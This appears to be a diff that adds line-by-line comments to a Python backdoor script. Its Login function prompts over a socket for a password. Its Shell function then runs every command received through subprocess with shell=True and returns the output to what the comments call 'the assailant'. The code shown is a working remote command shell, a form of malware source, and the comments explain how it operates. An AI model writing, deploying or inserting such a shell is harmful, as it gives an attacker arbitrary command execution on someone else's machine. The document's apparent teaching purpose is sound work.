@@ -46,13 +46,22 @@ def Login():
 
     """
     global s
+    
+    # Send the connecting client a vague login prompt
     s.send('Login: ')
+    
+    # Expect 1024 bytes
     pwd = s.recv(1024)
 
+    # If the provided input does not match the specified password we just call this same function again 
     if pwd.strip() != password:
         Login()
     else:
+        
+        # If the user got the password correct, we send an eager prompt to the assailant over socket
         s.send('Connected #> ')
+        
+        # Start the `Shell` function
         Shell()
 
 
@@ -66,16 +75,27 @@ def Shell():
         None
 
     """
+    
+    # Loop until interrupted
     while True:
+        
+        # Receive 1024 bytes of data at a time from socket
         data = s.recv(1024)
 
+        # If that data is a message with the `!die` command, we do just that - by breaking out of the loop
         if data.strip() == '!die':
             break
 
+        # Spawn a subprocess that executes whatever command received over the socket
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        
+        # Fill `output` with our processes output to be sent over the socket to the connected client
         output = proc.stdout.read() + proc.stderr.read()
-
+        
+        # Send the processes output back over the socket to the client
         s.send(output)
+        
+        # Send an eager prompt to the assailant
         s.send('#> ')
 
 
